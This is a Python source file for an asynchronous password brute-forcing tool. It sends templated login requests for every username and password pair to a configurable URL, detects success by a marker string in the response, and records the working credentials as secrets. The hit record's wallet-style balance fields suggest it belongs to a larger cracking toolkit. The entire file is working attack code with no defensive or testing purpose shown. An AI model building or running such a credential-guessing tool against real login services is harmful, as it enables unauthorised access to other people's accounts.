import asyncio
import json

import httpx

SEM = asyncio.Semaphore(4)


async def attempt(client, job, cfg, user, pw):
    body = cfg["body"].replace("{user}", user).replace("{pass}", pw)
    headers = dict(cfg.get("headers") or {})
    async with SEM:
        if job.stop_flag.is_set():
            return
        try:
            r = await client.request(
                cfg.get("method", "POST"),
                cfg["url"],
                content=body.encode(),
                headers=headers,
                timeout=25,
                follow_redirects=True,
            )
        except Exception:
            job.checked += 1
            return
        job.checked += 1
        text = r.text
        if cfg.get("success_marker") and cfg["success_marker"] in text:
            job.hit(f"{user}:{pw}", {"balance_wei": 0, "nonce": 0}, secret=f"{user}:{pw}")
            if cfg.get("stop_on_hit", True):
                job.stop_flag.set()


async def _run(job):
    cfg = job.params["config"]
    if isinstance(cfg, str):
        cfg = json.loads(cfg)
    users = [u.strip() for u in job.params["users"].splitlines() if u.strip()]
    pws = [p.strip() for p in job.params["passwords"].splitlines() if p.strip()]
    job.total = len(users) * len(pws)
    async with httpx.AsyncClient() as client:
        tasks = []
        for u in users:
            for p in pws:
                tasks.append(attempt(client, job, cfg, u, p))
                if len(tasks) % 500 == 0:
                    await asyncio.gather(*tasks)
                    tasks = []
                    job.note(f"{job.checked} tried")
        await asyncio.gather(*tasks)


def run(job):
    asyncio.run(_run(job))
